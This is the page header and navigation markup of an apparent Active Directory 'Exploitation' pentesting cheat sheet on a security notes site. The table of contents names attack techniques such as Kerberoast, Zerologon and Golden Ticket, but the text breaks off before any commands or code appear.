<!DOCTYPE html>
<html class="no-js" lang="en"> <head><meta charset="utf-8"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="Think Red, Act Blue" name="description"/><meta content="neutron" name="author"/><link href="https://neutronsec.com/cheat_sheets/active_directory/exploitation/" rel="canonical"/><link href="../../../assets/favicon.png" rel="icon"/><meta content="mkdocs-1.4.0, mkdocs-material-8.4.4+insiders-4.23.1" name="generator"/><title>Exploitation - neutronsec</title><link href="../../../assets/stylesheets/main.6148a559.min.css" rel="stylesheet"/><link href="../../../assets/stylesheets/palette.cbb835fc.min.css" rel="stylesheet"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/><style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style><link href="../../../stylesheets/extra.css" rel="stylesheet"/><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>html.glightbox-open { overflow: initial; height: 100%; }</style><script src="../../../assets/javascripts/glightbox.min.js"></script></head> <body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="" dir="ltr"> <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/> <input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> <a class="md-skip" href="#summary"> Skip to content </a> </div> <div data-md-component="announce"> </div> <header class="md-header" data-md-component="header"> <nav aria-label="Header" class="md-header__inner md-grid"> <a aria-label="neutronsec" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="neutronsec"> <img alt="logo" src="../../../assets/images/illustration.png"/> </a> <label class="md-header__button md-icon" for="__drawer"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> neutronsec </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> Exploitation </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input aria-label="Switch to light mode" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme)" data-md-color-primary="" data-md-color-scheme="" id="__palette_0" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"></path></svg> </label> <input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="indigo" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> <input aria-label="Switch to system preference" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="indigo" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to system preference"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/> <label class="md-search__icon md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </label> <nav aria-label="Search" class="md-search__options"> <a aria-label="Share" class="md-search__icon md-icon" data-clipboard="" data-clipboard-text="" data-md-component="search-share" href="javascript:void(0)" tabindex="-1" title="Share"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"></path></svg> </a> <button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg> </button> </nav> <div class="md-search__suggest" data-md-component="search-suggest"></div> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" data-md-scrollfix=""> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list"></ol> </div> </div> </div> </div> </div> </nav> </header> <div class="md-container" data-md-component="container"> <nav aria-label="Tabs" class="md-tabs" data-md-component="tabs"> <div class="md-tabs__inner md-grid"> <ul class="md-tabs__list"> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../.."> Home </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../../about/"> About </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../../blog/"> Blog </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link md-tabs__link--active" href="../../../docs/"> Notes </a> </li> </ul> </div> </nav> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a aria-label="neutronsec" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="neutronsec"> <img alt="logo" src="../../../assets/images/illustration.png"/> </a> neutronsec </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../.."> <span class="md-ellipsis"> Home </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../about/"> <span class="md-ellipsis"> About </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" id="__nav_3" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../../blog/"> <span class="md-ellipsis"> Blog </span> </a> <label class="md-nav__link" for="__nav_3"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Blog" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_3"> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" id="__nav_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_3_2"> <span class="md-ellipsis"> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Archive" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_2"> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/archive/2022/"> <span class="md-ellipsis"> 2022 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" id="__nav_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_3_3"> <span class="md-ellipsis"> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Categories" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_3"> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/blog/"> <span class="md-ellipsis"> Blog </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/blue-team/"> <span class="md-ellipsis"> Blue Team </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/hackthebox/"> <span class="md-ellipsis"> HackTheBox </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/powershell/"> <span class="md-ellipsis"> Powershell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../blog/category/soc/"> <span class="md-ellipsis"> SOC </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" id="__nav_4" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../../docs/"> <span class="md-ellipsis"> Notes </span> </a> <label class="md-nav__link" for="__nav_4"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Notes" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_4"> <span class="md-nav__icon md-icon"></span> Notes </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" id="__nav_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2"> <span class="md-ellipsis"> Cheatsheets </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cheatsheets" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_2"> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1" id="__nav_4_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1"> <span class="md-ellipsis"> Pentesting / CTF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pentesting / CTF" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_2_1"> <span class="md-nav__icon md-icon"></span> Pentesting / CTF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_1" id="__nav_4_2_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../cheatsheet_aid/"> <span class="md-ellipsis"> Basics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../enumeration_and_attacks/"> <span class="md-ellipsis"> Enumeration/Attacks </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/> <label class="md-nav__link md-nav__link--active" for="__toc"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <a class="md-nav__link md-nav__link--active" href="./"> <span class="md-ellipsis"> Exploitation </span> </a> <nav aria-label="Table of contents" class="md-nav md-nav--secondary"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="#summary"> <span class="md-ellipsis"> Summary </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#tools"> <span class="md-ellipsis"> Tools </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#domain-enumeration"> <span class="md-ellipsis"> Domain Enumeration </span> </a> <nav aria-label="Domain Enumeration" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#using-powerview"> <span class="md-ellipsis"> Using PowerView </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#using-ad-module"> <span class="md-ellipsis"> Using AD Module </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#using-bloodhound"> <span class="md-ellipsis"> Using BloodHound </span> </a> <nav aria-label="Using BloodHound" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#remote-bloodhound"> <span class="md-ellipsis"> Remote BloodHound </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#on-site-bloodhound"> <span class="md-ellipsis"> On Site BloodHound </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#useful-enumeration-tools"> <span class="md-ellipsis"> Useful Enumeration Tools </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#local-privilege-escalation"> <span class="md-ellipsis"> Local Privilege Escalation </span> </a> <nav aria-label="Local Privilege Escalation" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#useful-local-priv-esc-tools"> <span class="md-ellipsis"> Useful Local Priv Esc Tools </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#lateral-movement"> <span class="md-ellipsis"> Lateral Movement </span> </a> <nav aria-label="Lateral Movement" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#powershell-remoting"> <span class="md-ellipsis"> PowerShell Remoting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#remote-code-execution-with-ps-credentials"> <span class="md-ellipsis"> Remote Code Execution with PS Credentials </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#import-a-powershell-module-and-execute-its-functions-remotely"> <span class="md-ellipsis"> Import a PowerShell Module and Execute its Functions Remotely </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#executing-remote-stateful-commands"> <span class="md-ellipsis"> Executing Remote Stateful commands </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#mimikatz"> <span class="md-ellipsis"> Mimikatz </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#remote-desktop-protocol"> <span class="md-ellipsis"> Remote Desktop Protocol </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#url-file-attacks"> <span class="md-ellipsis"> URL File Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#useful-tools"> <span class="md-ellipsis"> Useful Tools </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#domain-privilege-escalation"> <span class="md-ellipsis"> Domain Privilege Escalation </span> </a> <nav aria-label="Domain Privilege Escalation" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#kerberoast"> <span class="md-ellipsis"> Kerberoast </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#asreproast"> <span class="md-ellipsis"> ASREPRoast </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#password-spray-attack"> <span class="md-ellipsis"> Password Spray Attack </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#force-set-spn"> <span class="md-ellipsis"> Force Set SPN </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-shadow-copies"> <span class="md-ellipsis"> Abusing Shadow Copies </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#list-and-decrypt-stored-credentials-using-mimikatz"> <span class="md-ellipsis"> List and Decrypt Stored Credentials using Mimikatz </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#unconstrained-delegation"> <span class="md-ellipsis"> Unconstrained Delegation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#constrained-delegation"> <span class="md-ellipsis"> Constrained Delegation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#resource-based-constrained-delegation"> <span class="md-ellipsis"> Resource Based Constrained Delegation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#dnsadmins-abuse"> <span class="md-ellipsis"> DNSAdmins Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-active-directory-integraded-dns"> <span class="md-ellipsis"> Abusing Active Directory-Integraded DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-backup-operators-group"> <span class="md-ellipsis"> Abusing Backup Operators Group </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-exchange"> <span class="md-ellipsis"> Abusing Exchange </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#weaponizing-printer-bug"> <span class="md-ellipsis"> Weaponizing Printer Bug </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-acls"> <span class="md-ellipsis"> Abusing ACLs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abusing-ipv6-with-mitm6"> <span class="md-ellipsis"> Abusing IPv6 with mitm6 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#sid-history-abuse"> <span class="md-ellipsis"> SID History Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#exploiting-sharepoint"> <span class="md-ellipsis"> Exploiting SharePoint </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#zerologon"> <span class="md-ellipsis"> Zerologon </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#printnightmare"> <span class="md-ellipsis"> PrintNightmare </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#active-directory-certificate-services"> <span class="md-ellipsis"> Active Directory Certificate Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#utilize-openssl-to-convert-to-pkcs-12-format"> <span class="md-ellipsis"> Utilize openssl to Convert to PKCS #12 Format </span> </a> <nav aria-label="Utilize openssl to Convert to PKCS #12 Format" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#no-pac"> <span class="md-ellipsis"> No PAC </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#domain-persistence"> <span class="md-ellipsis"> Domain Persistence </span> </a> <nav aria-label="Domain Persistence" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#golden-ticket-attack"> <span class="md-ellipsis"> Golden Ticket Attack </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#dcsync-attack"> <span class="md-ellipsis"> DCsync Attack </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#silver-ticket-attack"> <span class="md-ellipsis"> Silver Ticket Attack </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#skeleton-key-attack"> <span class="md-ellipsis"> Skeleton Key Attack </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#dsrm-abuse"> <span class="md-ellipsis"> DSRM Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#custom-ssp"> <span class="md-ellipsis"> Custom SSP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#cross-forest-attacks"> <span class="md-ellipsis"> Cross Forest Attacks </span> </a> <nav aria-label="Cross Forest Attacks" class="md-nav"> <ul class="md-nav__list"> <li class="md-nav__item"> <a class="md-nav__link" href="#trust-tickets"> <span class="md-ellipsis"> Trust Tickets </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#abuse-mssql-servers"> <span class="md-ellipsis"> Abuse MSSQL Servers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="#breaking-forest-trusts"> <span class="md-ellipsis"> Breaking Forest Trusts </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_2" id="__nav_4_2_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_2"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_2"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheatsheet-77/"> <span class="md-ellipsis"> Commands </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../linux_shortcuts/"> <span class="md-ellipsis"> Linux Shortcuts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../shells_payloads/"> <span class="md-ellipsis"> Shells &amp; Payloads </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web_requests/"> <span class="md-ellipsis"> Web requests </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../deobfuscation/"> <span class="md-ellipsis"> (De)Obfuscation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../brute_forcing/"> <span class="md-ellipsis"> Brute Forcing </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../common_apps/"> <span class="md-ellipsis"> Common Applications </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web_attacks/"> <span class="md-ellipsis"> Web Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfer/"> <span class="md-ellipsis"> File Transfer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/"> <span class="md-ellipsis"> Footprinting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheatsheet_ptpf/"> <span class="md-ellipsis"> Pivoting, Tunnel, Port Forwarding </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../info_gathering_web/"> <span class="md-ellipsis"> Information Gathering - Web </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../msf/"> <span class="md-ellipsis"> MSF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/"> <span class="md-ellipsis"> Password Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../attacking_common_services/"> <span class="md-ellipsis"> Attacking Common Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ffuf/"> <span class="md-ellipsis"> FFUF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../network_traffic_analysis/"> <span class="md-ellipsis"> Network Traffic Analysis </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" id="__nav_4_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3"> <span class="md-ellipsis"> Red Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Red Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_3"> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1" id="__nav_4_3_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_1" id="__nav_4_3_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_1"> <span class="md-ellipsis"> Initial Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Initial Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_1"> <span class="md-nav__icon md-icon"></span> Initial Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/initial_enum/external_recon_enum_principles/"> <span class="md-ellipsis"> External Recon </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/initial_enum/init_enum_domain/"> <span class="md-ellipsis"> Initial Enumeration of the Domain </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_2" id="__nav_4_3_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_2"> <span class="md-ellipsis"> Gaining a Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Gaining a Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_2"> <span class="md-nav__icon md-icon"></span> Gaining a Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/foothold/llmnr_nbtns_poisonong_from_linux/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../../active_directory/foothold/llmnr_nbtns_poisonong_from_windows/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_3" id="__nav_4_3_1_3" 